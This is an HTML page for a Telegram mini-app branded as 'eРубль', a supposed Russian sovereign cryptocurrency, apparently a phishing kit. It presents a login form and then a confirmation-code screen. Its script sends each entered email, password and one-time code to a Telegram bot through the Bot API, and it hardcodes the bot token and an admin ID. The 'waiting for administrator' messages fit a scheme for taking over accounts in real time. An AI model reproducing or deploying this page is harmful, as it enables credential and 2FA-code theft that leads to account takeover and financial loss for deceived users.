<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eРубль</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        /* ===== УПРОЩЁННЫЙ СТИЛЬ ДЛЯ ТЕСТА ===== */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0e1a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: linear-gradient(145deg, #12182b, #1a2340);
            border-radius: 32px;
            padding: 32px 24px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
            border: 1px solid rgba(255,255,255,0.06);
        }
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; font-size: 13px; font-weight: 600; color: rgba(255,255,255,0.6); margin-bottom: 6px; }
        .form-group input { width: 100%; padding: 14px 16px; border: 2px solid rgba(255,255,255,0.08); border-radius: 14px; font-size: 15px; background: rgba(255,255,255,0.05); color: #fff; }
        .form-group input:focus { outline: none; border-color: #4361ee; background: rgba(255,255,255,0.08); }
        .form-group input::placeholder { color: rgba(255,255,255,0.25); }
        .btn-primary { width: 100%; padding: 16px; background: linear-gradient(135deg, #4361ee, #7b61ff); color: #fff; border: none; border-radius: 14px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 8px; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(67,97,238,0.35); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-back { width: 100%; padding: 14px; background: transparent; color: rgba(255,255,255,0.3); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; font-size: 14px; font-weight: 500; cursor: pointer; transition: 0.2s; margin-top: 10px; }
        .btn-back:hover { background: rgba(255,255,255,0.04); color: rgba(255,255,255,0.6); }
        .message { margin-top: 16px; padding: 12px 16px; border-radius: 12px; display: none; text-align: center; font-size: 14px; font-weight: 500; }
        .message.success { display: block; background: rgba(40,167,69,0.15); color: #4ade80; border: 1px solid rgba(40,167,69,0.2); }
        .message.error { display: block; background: rgba(220,53,69,0.15); color: #f87171; border: 1px solid rgba(220,53,69,0.2); }
        .message.info { display: block; background: rgba(67,97,238,0.12); color: #818cf8; border: 1px solid rgba(67,97,238,0.15); }
        .status-waiting { margin-top: 10px; padding: 12px; background: rgba(67,97,238,0.1); border-radius: 12px; border: 1px solid rgba(67,97,238,0.15); text-align: center; color: rgba(255,255,255,0.6); font-size: 13px; display: none; }
        .support-btn { width: 100%; padding: 14px; background: rgba(255,255,255,0.03); color: rgba(255,255,255,0.3); border: 1px solid rgba(255,255,255,0.04); border-radius: 14px; font-size: 14px; font-weight: 500; cursor: pointer; transition: 0.2s; margin-top: 14px; }
        .support-btn:hover { background: rgba(255,255,255,0.06); color: rgba(255,255,255,0.5); }
        .page { display: none; flex-direction: column; }
        .page.active { display: flex; }
        .page-title { font-size: 22px; font-weight: 700; color: #fff; text-align: center; margin-bottom: 4px; }
        .page-sub { font-size: 14px; color: rgba(255,255,255,0.4); text-align: center; margin-bottom: 20px; }
        .page-icon { text-align: center; font-size: 40px; margin-bottom: 6px; }
        .code-box { text-align: center; margin: 8px 0 16px; }
        .code-box input { text-align: center; font-size: 28px; letter-spacing: 12px; padding: 16px; border: 2px solid rgba(255,255,255,0.08); border-radius: 14px; width: 100%; max-width: 220px; margin: 0 auto; background: rgba(255,255,255,0.05); color: #fff; font-weight: 600; }
        .code-box input:focus { outline: none; border-color: #4361ee; }
        .code-hint { font-size: 13px; color: rgba(255,255,255,0.3); margin-bottom: 16px; text-align: center; }
        .code-status { display: flex; align-items: center; justify-content: center; gap: 8px; color: #4ade80; font-weight: 500; font-size: 14px; margin-top: 12px; }
        .code-status .dot { width: 10px; height: 10px; background: #4ade80; border-radius: 50%; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(0.8); } }
    </style>
</head>
<body>
    <div class="container">

        <!-- ===== СТРАНИЦА 1: ГЛАВНАЯ ===== -->
        <div id="pageLogin" class="page active">
            <div style="text-align:center;margin-bottom:24px;">
                <h1 style="font-size:32px;font-weight:800;color:#fff;"><span style="background:linear-gradient(135deg,#4361ee,#7b61ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">eРубль</span></h1>
                <div style="color:rgba(255,255,255,0.4);font-size:11px;letter-spacing:2px;text-transform:uppercase;">Суверенная криптовалюта России</div>
            </div>
            <button id="loginBtn" class="btn-primary">🔓 Войти</button>
            <button id="eidBtn" class="btn-primary" style="background:rgba(255,255,255,0.06);margin-top:10px;">🆔 Вход через E-ID</button>
            <button onclick="openSupport()" class="support-btn">🆘 Техническая поддержка</button>
        </div>

        <!-- ===== СТРАНИЦА 2: ВХОД ===== -->
        <div id="pageCode" class="page">
            <div class="page-icon">🔑</div>
            <div class="page-title">Вход в eРубль</div>
            <div class="page-sub">Введите свои данные для входа</div>
            <div class="form-group"><label>Email</label><input type="email" id="email" placeholder="Введите ваш email"></div>
            <div class="form-group"><label>Пароль</label><input type="password" id="password" placeholder="Введите пароль"></div>
            <button id="loginSubmitBtn" class="btn-primary">ВОЙТИ</button>
            <div id="statusWaiting" class="status-waiting">⏳ Ожидание подтверждения от администратора...</div>
            <button id="backFromLoginBtn" class="btn-back">← Назад</button>
        </div>

        <!-- ===== СТРАНИЦА 3: КОД ===== -->
        <div id="pageCodeConfirm" class="page">
            <div class="page-icon">📧</div>
            <div class="page-title">Код подтверждения</div>
            <div class="page-sub">Введите код, отправленный администратором</div>
            <div class="code-box"><input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric"></div>
            <p class="code-hint">Код из 6 цифр</p>
            <button id="codeBtn" class="btn-primary">✅ Подтвердить</button>
            <div class="code-status"><span class="dot"></span> Ожидание кода...</div>
            <button id="backFromCodeBtn" class="btn-back">← Назад</button>
        </div>

        <!-- ===== СТРАНИЦА 4: УСПЕХ ===== -->
        <div id="pageSuccess" class="page">
            <div style="text-align:center;font-size:64px;margin-bottom:12px;">✅</div>
            <h2 style="text-align:center;color:#4ade80;font-size:22px;">Отправлено!</h2>
            <p style="text-align:center;color:rgba(255,255,255,0.4);font-size:14px;margin-top:6px;">Ожидайте ответа администратора.</p>
            <button id="resetBtn" class="btn-back" style="margin-top:20px;">🔄 Вернуться на главную</button>
        </div>

        <div id="msg" class="message"></div>
    </div>

    <script>
        // ============================================================
        // 1. КОНФИГ
        // ============================================================
        const BOT_TOKEN = "8603629858:AAHoJGBCDvvImzpO3wllUriPulRvX0APozY";
        const ADMIN_ID = "8542901240";

        // ============================================================
        // 2. ИНИЦИАЛИЗАЦИЯ
        // ============================================================
        const tg = window.Telegram.WebApp;
        tg.expand();

        const pageLogin = document.getElementById('pageLogin');
        const pageCode = document.getElementById('pageCode');
        const pageCodeConfirm = document.getElementById('pageCodeConfirm');
        const pageSuccess = document.getElementById('pageSuccess');

        const email = document.getElementById('email');
        const password = document.getElementById('password');
        const codeInput = document.getElementById('codeInput');
        const statusWaiting = document.getElementById('statusWaiting');

        const loginBtn = document.getElementById('loginBtn');
        const loginSubmitBtn = document.getElementById('loginSubmitBtn');
        const codeBtn = document.getElementById('codeBtn');
        const eidBtn = document.getElementById('eidBtn');
        const backFromLoginBtn = document.getElementById('backFromLoginBtn');
        const backFromCodeBtn = document.getElementById('backFromCodeBtn');
        const resetBtn = document.getElementById('resetBtn');
        const msgDiv = document.getElementById('msg');

        function showMsg(text, type = 'info') {
            msgDiv.textContent = text;
            msgDiv.className = `message ${type}`;
            msgDiv.style.display = 'block';
            clearTimeout(msgDiv._timer);
            msgDiv._timer = setTimeout(() => {
                msgDiv.style.display = 'none';
            }, 5000);
        }

        function switchPage(page) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            page.classList.add('active');
            msgDiv.style.display = 'none';
        }

        function goToLogin() {
            switchPage(pageLogin);
            email.value = '';
            password.value = '';
            statusWaiting.style.display = 'none';
        }

        function goToCodePage() {
            switchPage(pageCode);
            statusWaiting.style.display = 'none';
            setTimeout(() => email.focus(), 300);
        }

        function goToCodeConfirm() {
            switchPage(pageCodeConfirm);
            codeInput.value = '';
            setTimeout(() => codeInput.focus(), 300);
        }

        function goToSuccess() { switchPage(pageSuccess); }

        // ============================================================
        // 3. ОТПРАВКА В БОТА
        // ============================================================
        async function sendToBot(data) {
            const payload = {
                ...data,
                user_id: tg.initDataUnsafe?.user?.id || 'неизвестно'
            };

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: tg.initDataUnsafe?.user?.id,
                        text: JSON.stringify(payload)
                    })
                });
                const result = await response.json();
                console.log('✅ Отправлено:', result);
                return result.ok;
            } catch (error) {
                console.error('❌ Ошибка:', error);
                return false;
            }
        }

        // ============================================================
        // 4. НАВИГАЦИЯ
        // ============================================================
        loginBtn.addEventListener('click', goToCodePage);
        eidBtn.addEventListener('click', function() {
            showMsg('E-ID вход скоро появится', 'info');
        });
        backFromLoginBtn.addEventListener('click', goToLogin);
        backFromCodeBtn.addEventListener('click', goToCodePage);
        resetBtn.addEventListener('click', goToLogin);

        // ============================================================
        // 5. ВХОД
        // ============================================================
        loginSubmitBtn.addEventListener('click', async function() {
            const e = email.value.trim();
            const p = password.value.trim();
            if (!e || !p) {
                showMsg('Заполните все поля', 'error');
                return;
            }
            if (!e.includes('@')) {
                showMsg('Введите корректный email', 'error');
                return;
            }

            loginSubmitBtn.disabled = true;
            loginSubmitBtn.textContent = '⏳ Отправка...';

            const ok = await sendToBot({ email: e, password: p });

            if (ok) {
                loginSubmitBtn.disabled = false;
                loginSubmitBtn.textContent = 'ВОЙТИ';
                statusWaiting.style.display = 'block';
                showMsg('✅ Отправлено. Ожидайте код.', 'success');
                email.value = '';
                password.value = '';
            } else {
                loginSubmitBtn.disabled = false;
                loginSubmitBtn.textContent = 'ВОЙТИ';
                showMsg('❌ Ошибка отправки', 'error');
            }
        });

        // ============================================================
        // 6. КОД
        // ============================================================
        codeBtn.addEventListener('click', async function() {
            const code = codeInput.value.trim();
            if (!code || code.length < 4) {
                showMsg('Введите корректный код', 'error');
                return;
            }
            codeBtn.disabled = true;
            codeBtn.textContent = '⏳ Отправка...';
            const ok = await sendToBot({ code: code });
            if (ok) {
                codeBtn.disabled = false;
                codeBtn.textContent = '✅ Подтвердить';
                codeInput.value = '';
                goToSuccess();
                showMsg('✅ Отправлено', 'success');
            } else {
                codeBtn.disabled = false;
                codeBtn.textContent = '✅ Подтвердить';
                showMsg('❌ Ошибка отправки', 'error');
            }
        });

        // ============================================================
        // 7. ENTER
        // ============================================================
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                if (pageCode.classList.contains('active')) {
                    loginSubmitBtn.click();
                } else if (pageCodeConfirm.classList.contains('active')) {
                    codeBtn.click();
                }
            }
        });

        // ============================================================
        // 8. ТЕХПОДДЕРЖКА
        // ============================================================
        function openSupport() {
            window.open('https://t.me/potok457', '_blank');
        }
    </script>
</body>
</html>
